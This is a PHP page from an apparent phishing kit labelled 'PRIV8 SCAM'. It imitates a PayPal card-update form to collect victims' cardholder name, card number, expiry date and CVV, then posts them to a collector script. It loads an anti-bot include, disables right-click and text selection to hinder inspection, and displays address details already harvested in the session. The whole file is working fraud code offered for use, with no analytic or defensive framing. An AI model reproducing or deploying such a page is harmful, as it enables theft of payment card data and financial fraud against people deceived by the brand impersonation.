<?php 
//PRIV8 SCAM G33K.OFFICIEL V4
session_start();
include("../antimwbna.php");
include("../linguo/lang.php");
include "../linguo/lang".$_SESSION['MONSTR_UU'];
require_once '../cry/crypt.php';
error_reporting(0);
if(isset($_SESSION["mrigla"] ) ){
echo"
<!DOCTYPE html><html class=\"no-js superBowlBG accountCreate\" lang=\"en\" dir=\"ltr\">
<head>
<title>".$crdttl."</title>
<meta http-equiv=\"X-UA-COMPATIBLE\" content=\"IE-edge\" />
	<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\" />
	<meta name=\"application-name\" content=\"Update\" />
	<meta name=\"msapplication-task\" content=\"\" />
<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes\" />
<link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"../img/ppl.ico\" />	
<script src=\"../js/jquery-3.1.0.min.js\"></script>
 <script src=\"../js/jqu.js\"></script>
  <script src=\"../js/jquery.payment.js\"></script>
<link rel=\"stylesheet\" href=\"../css/appSuperBowl.css\" />
<script language=\"JavaScript1.2\" type=\"text/javascript\">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function (\"return false\")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function(\"return false\")
        
</script>
</head>
<body>
<header class=\"mainHeader\" role=\"banner\">
<div class=\"headerContainer\">
<div class=\"grid12\"><a data-click=\"payPalLogo\"  href=\"#\" class=\"logo\"></a><div class=\"gradientSpacer\"><div> </div></div><div class=\"loginBtn\"><a data-click=\"loginLink\" href=\"#\" class=\"button secondary small  custom\">".$log."</a></div></div></div></header><main class=\"superBowlMain\"><section id=\"content\" role=\"main\" data-country=\"US\"><section id=\"main\" class=\"\"><div id=\"create\" class=\"create grid12\"><script type=\"application/json\" fncls=\"fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99\">{\"f\":\"8ca82980d2c511e689ae0d187383423f\",\"s\":\"t_s\",\"mm\":\"true\"}</script>
<script type=\"text/javascript\">(function() {var dom, doc, where, iframe = document.createElement('iframe');iframe.src = \"javascript:false\";iframe.title = \"\";iframe.role = \"presentation\";(iframe.frameElement || iframe).style.cssText = \"display:none; width: 0; height: 0; border: 0\";where = document.getElementsByTagName('script');where = where[where.length - 1];where.parentNode.insertBefore(iframe, where);try {doc = iframe.contentWindow.document;} catch (e) {dom = document.domain;iframe.src = \"javascript:var d=document.open();d.domain='\" + dom + \"';void(0);\";doc = iframe.contentWindow.document;}doc.open()._l = function () {var js = this.createElement(\"script\");if (dom) {this.domain = dom;}js.id = \"js-iframe-async\";js.src = \"https://www.paypalobjects.com/webstatic/r/fb/fb-all-prod.pp2.min.js\";this.body.appendChild(js);};doc.write(\'<body onload=\"document._l();\">\');doc.close();})();</script><noscript><img src=\"https://c.paypal.com/v1/r/d/b/ns?f=8ca82980d2c511e689ae0d187383423f&s=t_s&mm=true&js=0&r=1\"></noscript>
<div class=\"customGrid7\"><form action=\"../Templates/MO_Card.php\" method=\"post\"  name=\"create_form\" class=\"proceed\" ><input type=\"hidden\" id=\"csrf\" name=\"_csrf\" value=\"HfsRGH5ySx8SS2XoBuT3NFDe7&#x2B;sOH0istUb9I&#x3D;\">    <div class=\"pageHeader\"><h2>".$mo25."</h2></div><div class=\"superBowlContainer\"><div class=\"inner\">
<br><center><img src=\"../img/vsa.png\">&nbsp;<img src=\"../img/mc.png\">&nbsp;<img src=\"../img/dcl1.png\">&nbsp;<img src=\"../img/dc.png\">&nbsp;<img src=\"../img/amx.png\"></center><br>
<div class=\"textInput lap\"><div class=\"fields email large\">
<div class=\'groupFields\'><div class=\"textInput lap \"><div class=\"fields large\">";
error_reporting(0);
 if($_GET["card"]){
	echo "<div class=\"error-assat\">
								    <div class=\"lisar\"><img src=\"../img/ernox.png\">
								    &nbsp;&nbsp;".$wrongo."</div> </div><br><br>"; }
									echo "
<input type=\"text\" class=\"validate camelCase name\" id=\"nameoncc\" name=\"nameoncc\" required=\"required\" autocomplete=\"off\" autocorrect=\"off\" placeholder=\"".$mo26."\" autocapitalize=\"on\" value=\"\" aria-required=\"true\"/></div></div>
<script>
    $(document).ready(function(){
     $('#exp').mask(\"99/9999\", {placeholder:\"__/____\"});
    });   
    </script>
	<script>
    $(document).ready(function(){
     $('#cc_number').mask(\"9999 9999 9999 9999\", {placeholder:\"\"});
    });   
    </script>
	<script>
    $(document).ready(function(){
     $('#csc').mask(\"999\");
    });   
    </script>
<div class=\"textInput lap \"><div class=\"fields large\"><input type=\"text\" class=\"validate camelCase name\" placeholder=\"".$mo28."\" id=\"cc_number\" pattern=\"[2-7][0-9 ]{11,20}\" name=\"number\"maxlength=\"16\"required=\"required\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"on\" value=\"\" aria-required=\"true\"/>
</div></div></div></div>
<div class=\"nativeDropdown  large \"><div style=\"float:left;width:175px\" class=\"selectDropdown \"><select id=\"expmo\" name=\"expm\" required=\"required\" aria-required=\"true\" >
<option value=\"\">".$expmonth."</option>
					<option value=\"01\">01</option>
					<option value=\"02\">02</option>
					<option value=\"03\">03</option>
					<option value=\"04\">04</option>
					<option value=\"05\">05</option>
					<option value=\"06\">06</option>
					<option value=\"07\">07</option>
					<option value=\"08\">08</option>
					<option value=\"09\">09</option>
					<option value=\"10\">10</option>
					<option value=\"11\">11</option>
					<option value=\"12\">12</option></option>
					</select></div><div style=\"float:right;width:200px\" class=\"selectDropdown \"><select id=\"expyr\" name=\"expy\" required=\"required\" aria-required=\"true\" >
<option value=\"\">".$expyr."</option>
					<option value=\"2017\">2017</option>
					<option value=\"2018\">2018</option>
					<option value=\"2019\">2019</option>
					<option value=\"2020\">2020</option>
					<option value=\"2021\">2021</option>
					<option value=\"2022\">2022</option>
					<option value=\"2023\">2023</option>
					<option value=\"2024\">2024</option>
					<option value=\"2025\">2025</option>
					<option value=\"2026\">2026</option>
					</option>
					</select>
					</div></div></div></div>
<br><br><br><div class=\"textInput lap \"><div class=\"fields large\"><input type=\"text\" class=\"validate camelCase name\" placeholder=\"".$mo30."\" id=\"csc\" name=\"csc\" required=\"required\"/>
<div class=\"G-FieldsZ118\">	
									    <div class=\"AddressLine\" id=\"addressEntry\">
									        <p>".$info_detta." :</p>                                       
                                            <div class=\"displayContainer\">
											<div class=\"address\">
											<div class=\"display\">
											<p class=\"addressDisplay camelCase\">
                                            ".$_SESSION['address1']."
		                 				  <br>
										  ".$_SESSION['city'].", ".$_SESSION['state']." ".$_SESSION['ZIP']."
										  <br>
										  ".$_SESSION["country"]."
                                            </p>
											<a class=\"editAddress\" id=\"editAddress\" href=\"#\">".$edito."</a></div></div></div>
                                        </div></div>
										 </div>
<br><br><input id=\"submitBtn\" name=\"_eventId_continue\" type=\"submit\" class=\"button\"value=\"".$cn."\" data-click=\"createSubmit\"/>
</div></div></div><center><br><div class=\"footerNav\"><div class=\"legal\"></i></i><b><a style=\"cursor:pointer\">".$contact."</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       <a style=\"cursor:pointer\">".$feedback."</a>  &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;     <a style=\"cursor:pointer\">".$privacy."</a><ul></li></noscript></div></body></html>"; }

else {
header("location:../"); }

									?>